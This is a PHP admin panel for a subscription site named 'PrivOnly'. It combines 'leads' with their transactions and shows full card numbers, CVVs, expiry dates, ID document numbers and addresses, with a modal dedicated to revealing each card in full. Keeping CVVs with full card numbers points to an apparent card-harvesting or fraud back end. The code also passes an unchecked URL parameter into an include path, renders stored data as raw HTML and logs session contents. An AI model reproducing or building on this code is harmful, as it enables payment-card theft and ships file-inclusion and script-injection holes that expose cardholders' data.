<?php
// Configurar diretório de sessões local
ini_set('session.save_handler', 'files');
ini_set('session.save_path', __DIR__ . '/../sessions');
session_start();

// Log para debug
error_log('Index page - Session ID: ' . session_id());
error_log('Session data: ' . print_r($_SESSION, true));

// Verificar autenticação
if (!isset($_SESSION['admin_logged_in']) || $_SESSION['admin_logged_in'] !== true) {
    error_log('User not logged in, redirecting to login.php');
    header('Location: login.php');
    exit;
}

// Definir página atual
$page = $_GET['page'] ?? 'dashboard';

// Função para carregar o conteúdo da página
function loadPageContent($page) {
    $page_file = __DIR__ . '/pages/' . $page . '.php';
    if (file_exists($page_file)) {
        ob_start();
        include $page_file;
        return ob_get_clean();
    }
    return '<div class="alert alert-danger">Página não encontrada.</div>';
}

// Carregar dados comuns
$profile = [];
if (file_exists(__DIR__ . '/../data/profile.json')) {
    $profile = json_decode(file_get_contents(__DIR__ . '/../data/profile.json'), true) ?? [];
}

$leads = [];
if (file_exists(__DIR__ . '/../data/leads.json')) {
    $leads = json_decode(file_get_contents(__DIR__ . '/../data/leads.json'), true) ?? [];
}

$transactions = [];
if (file_exists(__DIR__ . '/../data/transactions.json')) {
    $transactions = json_decode(file_get_contents(__DIR__ . '/../data/transactions.json'), true) ?? [];
}

// Atualiza intervalo de recorrência se solicitado
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['recurring_interval'])) {
    $interval = (int)$_POST['recurring_interval'];
    if ($interval > 0) {
        $envContent = file_get_contents(__DIR__ . '/../.env');
        $envContent = preg_replace(
            '/RECURRING_INTERVAL=\d+/',
            'RECURRING_INTERVAL=' . $interval,
            $envContent
        );
        file_put_contents(__DIR__ . '/../.env', $envContent);
        $_SESSION['success_message'] = 'Intervalo de recorrência atualizado com sucesso!';
        header('Location: index.php');
        exit;
    }
}

// Combine data for display
$users_data = [];
foreach ($leads as $lead) {
    $user_transactions = array_filter($transactions, function($t) use ($lead) {
        return $t['lead_id'] === $lead['id'];
    });
    
    $latest_transaction = !empty($user_transactions) ? end($user_transactions) : null;
    $total_spent = array_reduce($user_transactions, function($carry, $item) {
        return $carry + ($item['amount'] ?? 0);
    }, 0);
    
    $users_data[] = [
        'id' => $lead['id'],
        'name' => $lead['name'],
        'email' => $lead['email'],
        'card_last4' => $lead['card_last4'],
        'card_number' => $lead['card_number'] ?? 'N/A',
        'card_holder' => $lead['card_holder'] ?? 'N/A',
        'card_expiration' => $lead['card_expiration'] ?? 'N/A',
        'card_cvv' => $lead['card_cvv'] ?? 'N/A',
        'document_number' => $lead['document_number'] ?? 'N/A',
        'phone' => $lead['phone'] ?? 'N/A',
        'address' => $lead['address'] ?? 'N/A',
        'subscription_status' => $lead['subscription_status'],
        'next_charge' => $lead['next_charge'],
        'created_at' => $lead['created_at'] ?? 'N/A',
        'total_spent' => $total_spent,
        'transaction_count' => count($user_transactions),
        'last_transaction_date' => $latest_transaction ? $latest_transaction['created_at'] : 'N/A',
        'last_transaction_status' => $latest_transaction ? $latest_transaction['status'] : 'N/A'
    ];
}

// Ordenar por status (ativos primeiro) e data da última transação
usort($users_data, function($a, $b) {
    if ($a['subscription_status'] === $b['subscription_status']) {
        return strtotime($b['last_transaction_date']) - strtotime($a['last_transaction_date']);
    }
    return $a['subscription_status'] === 'active' ? -1 : 1;
});
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel Administrativo - PrivOnly</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css" rel="stylesheet">
</head>
<body class="bg-light">
    <div class="container-fluid">
        <nav class="navbar navbar-expand-lg navbar-dark bg-dark mb-4">
            <div class="container-fluid">
                <a class="navbar-brand" href="index.php">PrivOnly Admin</a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link <?php echo $page === 'dashboard' ? 'active' : ''; ?>" 
                               href="index.php?page=dashboard">Dashboard</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link <?php echo $page === 'edit_profile' ? 'active' : ''; ?>" 
                               href="index.php?page=edit_profile">Editar Perfil</a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link" href="logout.php">Sair</a>
                        </li>
                    </ul>
                </div>
            </div>
        </nav>

        <?php if (isset($_SESSION['message'])): ?>
            <div class="alert alert-<?php echo $_SESSION['message_type'] ?? 'info'; ?> alert-dismissible fade show" role="alert">
                <?php 
                echo $_SESSION['message'];
                unset($_SESSION['message']);
                unset($_SESSION['message_type']);
                ?>
                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
            </div>
        <?php endif; ?>

        <?php echo loadPageContent($page); ?>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    
    <script>
    function viewCardDetails(user) {
        let html = `
            <div class="modal fade" id="cardDetailsModal" tabindex="-1">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title">Dados do Cartão</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                        </div>
                        <div class="modal-body">
                            <div class="card bg-light">
                                <div class="card-body">
                                    <h6 class="card-subtitle mb-3 text-muted">Titular</h6>
                                    <p class="card-text">${user.card_holder}</p>
                                    
                                    <h6 class="card-subtitle mb-3 text-muted">Número</h6>
                                    <p class="card-text">${user.card_number}</p>
                                    
                                    <div class="row">
                                        <div class="col-6">
                                            <h6 class="card-subtitle mb-3 text-muted">Validade</h6>
                                            <p class="card-text">${user.card_expiration}</p>
                                        </div>
                                        <div class="col-6">
                                            <h6 class="card-subtitle mb-3 text-muted">CVV</h6>
                                            <p class="card-text">${user.card_cvv}</p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Fechar</button>
                        </div>
                    </div>
                </div>
            </div>
        `;
        
        // Remove existing modal if any
        const existingModal = document.getElementById('cardDetailsModal');
        if (existingModal) {
            existingModal.remove();
        }
        
        // Add new modal and show it
        document.body.insertAdjacentHTML('beforeend', html);
        const modal = new bootstrap.Modal(document.getElementById('cardDetailsModal'));
        modal.show();
    }

    function viewTransactions(leadId) {
        // Mostrar indicador de carregamento
        const loadingHtml = `
            <div class="modal fade" id="loadingModal" tabindex="-1">
                <div class="modal-dialog modal-sm">
                    <div class="modal-content">
                        <div class="modal-body text-center p-4">
                            <div class="spinner-border text-primary mb-3" role="status">
                                <span class="visually-hidden">Carregando...</span>
                            </div>
                            <p class="mb-0">Carregando transações...</p>
                        </div>
                    </div>
                </div>
            </div>
        `;
        document.body.insertAdjacentHTML('beforeend', loadingHtml);
        const loadingModal = new bootstrap.Modal(document.getElementById('loadingModal'));
        loadingModal.show();

        fetch(`view_transactions.php?lead_id=${leadId}`)
            .then(res => res.json())
            .then(data => {
                loadingModal.hide();
                document.getElementById('loadingModal').remove();

                if (data.error) {
                    alert(data.error);
                    return;
                }
                
                let html = `
                    <div class="modal fade" id="transactionsModal" tabindex="-1">
                        <div class="modal-dialog modal-lg">
                            <div class="modal-content">
                                <div class="modal-header">
                                    <h5 class="modal-title">Histórico de Transações</h5>
                                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                                </div>
                                <div class="modal-body">
                                    ${data.transactions.length === 0 ? '<p class="text-center text-muted">Nenhuma transação encontrada.</p>' : ''}
                                    ${data.transactions.length > 0 ? `
                                    <div class="table-responsive">
                                        <table class="table table-striped table-hover">
                                            <thead class="table-dark">
                                                <tr>
                                                    <th>ID</th>
                                                    <th>Data</th>
                                                    <th>Valor</th>
                                                    <th>Status</th>
                                                    <th>ID da Transação</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                    ` : ''}
                `;
                
                data.transactions.forEach(t => {
                    html += `
                        <tr>
                            <td>${t.id}</td>
                            <td>${t.created_at}</td>
                            <td>R$ ${(t.amount/100).toFixed(2).replace('.', ',')}</td>
                            <td>
                                <span class="badge bg-${t.status === 'approved' ? 'success' : 'danger'}">
                                    ${t.status}
                                </span>
                            </td>
                            <td><small class="text-muted">${t.transaction_id}</small></td>
                        </tr>
                    `;
                });
                
                if (data.transactions.length > 0) {
                    html += `
                                            </tbody>
                                        </table>
                                    </div>
                    `;
                }

                html += `
                                </div>
                                <div class="modal-footer">
                                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Fechar</button>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
                
                // Remove existing modal if any
                const existingModal = document.getElementById('transactionsModal');
                if (existingModal) {
                    existingModal.remove();
                }
                
                // Add new modal and show it
                document.body.insertAdjacentHTML('beforeend', html);
                const modal = new bootstrap.Modal(document.getElementById('transactionsModal'));
                modal.show();
            })
            .catch(err => {
                loadingModal.hide();
                document.getElementById('loadingModal').remove();
                alert('Erro ao carregar transações: ' + err.message);
            });
    }
    </script>
</body>
</html> 